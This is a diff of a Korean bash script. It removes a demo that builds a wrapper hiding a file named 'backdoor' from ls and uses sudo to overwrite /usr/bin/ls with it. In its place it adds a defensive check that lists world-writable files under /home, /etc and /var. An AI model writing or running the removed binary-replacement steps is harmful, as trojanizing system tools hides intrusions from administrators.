@@ -1,37 +1,21 @@
 #!/bin/bash
 
-echo " 이 스크립트를 진행하면 /usr/bin/ls 파일에 겹쳐쓰게 됩니다!"
-read -p "계속 진행하시겠습니까? (yes/no): " answer
+echo " 불필요한 world-writable 파일 점검 시작"
+echo "======================================="
 
-if [ "$answer" != "yes" ]; then
-    echo "작업이 취소되었습니다"
-    exit
-fi
+# 1. 위험 경로 중심 점검 (실무 방식)
+echo "/home 영역 검사"
+find /home -type f -perm -0002 2>/dev/null
 
-echo " 스크립트를 진행합니다..."
+echo ""
+echo " /etc 영역 검사 (설정 파일 위험)"
+find /etc -type f -perm -0002 2>/dev/null
 
-cd ~
+echo ""
+echo "/var 영역 검사 (로그/서비스 파일)"
+find /var -type f -perm -0002 2>/dev/null
 
-cat << "EOF" > a
-#!/bin/bash
-/home/user1/ls --color=auto -I backdoor "$@"
-EOF
-
-chmod +x a
-
-echo " backdoor 파일 확인"
-touch backdoor
-sudo ls
-
-echo " ./a 실행 (backdoor 숨김 확인)"
-
-sudo ./a
-
-echo " /usr/bin/ls 덮어쓰기"
-sudo cp a /usr/bin/ls
-
-echo " ls 실행"
-sudo ls
-
-echo "backdoor 탐색"
-find . -name backdoor
+echo ""
+echo "======================================="
+echo "필요 없는 world-writable 파일은 chmod 644 또는 640으로 수정 권장"
+echo "점검 완료"
